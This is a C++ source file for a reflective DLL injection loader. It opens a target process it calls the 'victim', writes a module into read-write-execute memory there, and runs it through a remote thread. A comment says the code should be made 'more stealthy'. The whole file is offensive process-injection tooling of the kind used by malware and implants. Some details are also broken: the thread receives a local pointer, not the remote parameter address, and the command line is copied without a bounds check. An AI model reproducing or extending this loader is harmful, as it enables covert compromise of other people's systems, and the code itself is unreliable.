#include "PeUtils.hpp"
#include "ReflectiveLoader.hpp"

#include <iterator>
#include "tlhelp32.h"

ReflectiveLoader::ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes, const std::wstring& command_line) :
	m_victim_process(std::make_unique<Process>(pid, access_rights)),
	m_module_to_inject(module_bytes),
	m_entrypoint_rva(get_entrypoint_from_exports(m_module_to_inject)),
	m_command_line(command_line),
	m_param(initialize_params(command_line))
{
}

ReflectiveLoader::ReflectiveLoader(const ByteVector& module_bytes, const std::wstring& command_line) :
	m_victim_process(find_victim_process()),
	m_module_to_inject(module_bytes),
	m_entrypoint_rva(get_entrypoint_from_exports(m_module_to_inject)),
	m_command_line(command_line),
	m_param(initialize_params(command_line))
{
}

ReflectiveLoader::~ReflectiveLoader()
{
	delete m_param;
}

void ReflectiveLoader::inject_module()
{
	// TODO: change this to be more stealthy
	m_remote_address = m_victim_process->allocate_memory(m_module_to_inject.size(), AllocationType::Commit, Protection::ProtectionReadWriteExecute);
	m_victim_process->write(m_remote_address, m_module_to_inject);

	m_param->base_address = m_remote_address;
	Address64 param_address = m_victim_process->allocate_memory(sizeof(REFLECTIVE_PARAMS), AllocationType::Commit, Protection::ProtectionReadWrite);
	ByteVector param_data(std::begin(m_param->command_line), std::end(m_param->command_line));
	m_victim_process->write(param_address, param_data);
}

void ReflectiveLoader::run_module_in_victim()
{
	m_thread = std::make_unique<Thread>(m_victim_process->get_pid(),
		ThreadCreationFlags::ThreadCreationNone,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(m_remote_address + m_entrypoint_rva),
		reinterpret_cast<LPVOID>(m_param));
}

NO_DISCARD ProcessPtr ReflectiveLoader::find_victim_process()
{
	return std::make_unique<Process>(process_utils::get_pid_by_name(VICTIM_PROCESS.data()), ProcessAccess::ProcessAllAccess);
}

NO_DISCARD Address64 ReflectiveLoader::get_entrypoint_from_exports(const ByteVector& module_to_inject)
{
	std::vector<Address64> exports = pe_utils::get_exports_rvas(module_to_inject);
	if (exports.size() > 0)
	{
		return exports[0];
	}

	return 0;
}

NO_DISCARD PREFLECTIVE_PARAMS ReflectiveLoader::initialize_params(const std::wstring& command_line)
{
	PREFLECTIVE_PARAMS params = new REFLECTIVE_PARAMS();
	std::memcpy(params->command_line, command_line.data(), command_line.size() * sizeof(wchar_t) + sizeof(wchar_t));

	return params;
}
